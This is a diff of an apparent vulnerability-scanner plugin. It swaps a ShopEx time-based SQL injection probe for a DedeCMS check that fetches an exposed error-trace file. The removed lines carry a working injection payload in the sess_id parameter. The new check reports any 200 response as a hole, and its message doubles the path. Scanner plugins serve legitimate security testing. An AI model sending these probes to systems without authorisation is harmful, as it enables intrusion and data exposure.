@@ -2,15 +2,14 @@
 #coding:utf-8
 
 import requests
-from time import clock
 from dummy import *
 
 info = {
-	'NAME':'ShopEx sess_id SQL Injection',
-	'AUTHOR':'seay,yangbh',
-	'TIME':'20140811',
+	'NAME':'dedecms 敏感信息泄露',
+	'AUTHOR':'seay,wjk',
+	'TIME':'20150323',
 	'WEB':'',
-	'DESCRIPTION':'Via：http://www.cnseay.com/3426/'
+	'DESCRIPTION':'dedecms 敏感信息泄露'
 }
 opts = [
 	['url','http://testasp.vulnweb.com','target url'],
@@ -18,20 +17,19 @@ opts = [
 
 def Assign(services):
 	if services.has_key('url') and services.has_key('cms'):
-		if services['cms'] == 'Shopex':
+		if services['cms'] == 'Dedecms':
 			return True
 	return False
 
 def Audit(services):
-	url = services['url'] + '/shopadmin/index.php?ctl=passport&act=login&sess_id=1%27%20and%20sleep%283%29--%201'
+	url = services['url'] +'/data/mysqli_error_trace.inc'
 	try:
 		rqu = requests.get(url)
-		start = clock()
 		if rqu.status_code == 200:
-			if rqu.text.find('<b>Warning</b>:  INSERT INTO `') != -1 or clock()-start in range(7,12):
-				security_note(url)
+			security_hole('dedecms error info:' + url + '/data/mysqli_error_trace.inc')
 	except:
 		pass
+
 # ----------------------------------------------------------------------------------------------------
 #	untest yet
 # ----------------------------------------------------------------------------------------------------
